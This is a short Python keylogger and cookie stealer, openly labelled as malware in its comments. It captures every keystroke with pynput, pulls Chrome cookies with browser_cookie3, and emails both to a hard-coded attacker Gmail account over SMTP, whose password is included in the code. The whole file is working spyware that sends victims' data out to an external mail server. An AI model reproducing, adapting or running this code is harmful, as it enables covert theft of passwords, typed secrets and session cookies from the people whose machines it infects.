from pynput import keyboard
import browser_cookie3
import os 
import smtplib
import time 

hackers_email = 'scumbag.hacker6841@gmail.com'
hackers_pw = 'Python1029'

keylogs = []
def on_press(key):
    try:
        #Writes alphanumerical characters to our log file
        keylogs.append('{0}'.format(key.char))
    except AttributeError:
        #Since pynput will throw an attribute error when typing a special key i.e holding shift
        #The exception will catch this and still write to our log file
        keylogs.append('{0}'.format(key))
def on_release(key):
    #This is used as a backdoor functionality to termiante the Malware. 
    if key == keyboard.Key.esc:
        return False
    
    

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
cj = browser_cookie3.chrome()
payload = {}
payload['Keylogs'] = keylogs
payload['Cookies'] = cj

#Setup SMTP server in order to exfiltrate victim's information
sent_from = hackers_email
to = hackers_email
subject = "Victims Info"
victims_info_email = """\
Subject: %s

%s
""" %(subject, payload)
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(hackers_email, hackers_pw)
    server.ehlo()
    server.sendmail(sent_from, to, victims_info_email.encode("utf8"))
    server.close()
    print("Successfully sent")







